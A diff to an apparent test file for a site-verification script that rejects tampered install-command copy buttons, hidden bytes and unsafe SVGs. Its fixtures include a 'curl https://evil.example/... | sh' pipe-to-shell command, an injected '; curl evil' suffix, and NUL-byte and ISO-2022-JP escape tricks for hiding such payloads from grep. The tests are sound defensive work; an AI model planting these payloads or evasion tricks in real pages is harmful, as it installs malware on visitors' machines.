@@ -227,14 +227,89 @@ describe("verify-site.sh", () => {
     expect(verify().stderr).toMatch(/contains an HTML comment/u);
   });
 
-  it("fails when a third copy button is added with other quoting", () => {
+  it("passes a home page that repeats a verified install command", () => {
     writeSite({
       "index.html": pageWithPolicy(
         HASHED_POLICY,
-        `${HOME_BODY}<button DATA-COPY='curl https://evil.example/i | sh'></button>`,
+        `${HOME_BODY}<button data-copy="npm install --global agemon"></button>`,
       ),
     });
-    expect(verify().stderr).toMatch(/exactly two install commands/u);
+    const result = verify();
+    expect(result.stderr).toBe("");
+    expect(result.status).toBe(0);
+  });
+
+  it.each([
+    ["other quoting", "<button DATA-COPY='curl https://evil.example/i | sh'>"],
+    ["no quotes", "<button data-copy=evil>"],
+    ["upper case", '<button DATA-COPY="curl https://evil.example/i | sh">'],
+    ["a longer attribute name", '<button data-copy-foo="x">'],
+    [
+      "a payload that extends a verified one",
+      '<button data-copy="npm install --global agemon; curl evil">',
+    ],
+  ])(
+    "fails on a home page copy button with %s on the same line as the verified ones",
+    (_case, button) => {
+      writeSite({
+        "index.html": pageWithPolicy(HASHED_POLICY, `${HOME_BODY}${button}`),
+      });
+      expect(verify().stderr).toMatch(
+        /every copy button on the home page must offer one of the two install commands/u,
+      );
+    },
+  );
+
+  it("fails on a copy button on any other page", () => {
+    writeSite({
+      "docs/index.html": pageWithPolicy(
+        POLICY,
+        '<button data-copy="npm install --global agemon"></button>',
+      ),
+    });
+    expect(verify().stderr).toMatch(
+      /docs\/index\.html has a copy button; only the home page may offer one/u,
+    );
+  });
+
+  it("fails on a NUL byte that would hide a payload and a meta refresh from grep", () => {
+    writeSite({
+      "index.html": pageWithPolicy(
+        HASHED_POLICY,
+        `${HOME_BODY}\n${" ".repeat(200_000)}\0<button data-copy="curl https://evil.example/x | sh"></button><meta http-equiv="refresh" content="0;url=https://evil.example/">`,
+      ),
+    });
+    expect(verify().stderr).toMatch(/index\.html contains a NUL byte/u);
+  });
+
+  it("fails on a NUL byte in a page whatever the case of its extension", () => {
+    writeSite({ "evil.HTML": "<html>\0</html>" });
+    expect(verify().stderr).toMatch(/evil\.HTML contains a NUL byte/u);
+  });
+
+  it("fails on a sitemap that declares an encoding other than UTF-8", () => {
+    writeSite({
+      "sitemap-0.xml":
+        '<?xml version="1.0" encoding="ISO-2022-JP"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></urlset>',
+    });
+    expect(verify().stderr).toMatch(
+      /sitemap-0\.xml declares an encoding other than UTF-8/u,
+    );
+  });
+
+  it("fails on an ESC byte in a stylesheet", () => {
+    writeSite({ "style.css": "a{}\u001b(B" });
+    expect(verify().stderr).toMatch(/style\.css contains an ESC byte/u);
+  });
+
+  it("fails on an ESC byte that a page decoded as ISO-2022-JP would drop", () => {
+    writeSite({
+      "index.html": pageWithPolicy(
+        HASHED_POLICY,
+        `${HOME_BODY}<button data-co\u001b(Bpy="curl https://evil.example/x | sh"></button>`,
+      ),
+    });
+    expect(verify().stderr).toMatch(/index\.html contains an ESC byte/u);
   });
 
   it("fails when a second http-equiv meta tag is added", () => {
@@ -301,6 +376,18 @@ describe("verify-site.sh", () => {
       false,
     ],
     ['<svg><rect style="fill:url(https://x.example/a#p)"/></svg>', false],
+    [
+      '<?xml version="1.0" encoding="ISO-2022-JP"?><svg xmlns="http://www.w3.org/2000/svg"><scr\u001b(Bipt>fetch("/x")</scr\u001b(Bipt></svg>',
+      false,
+    ],
+    [
+      '<?xml version="1.0" encoding="ISO-8859-1"?><svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>',
+      false,
+    ],
+    [
+      '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>',
+      true,
+    ],
   ])("judges %s the same way as the CSP step", (svg, accepted) => {
     writeSite({ "logo.svg": svg });
     expect(findSvgProblems(svg, "logo.svg").length === 0).toBe(accepted);
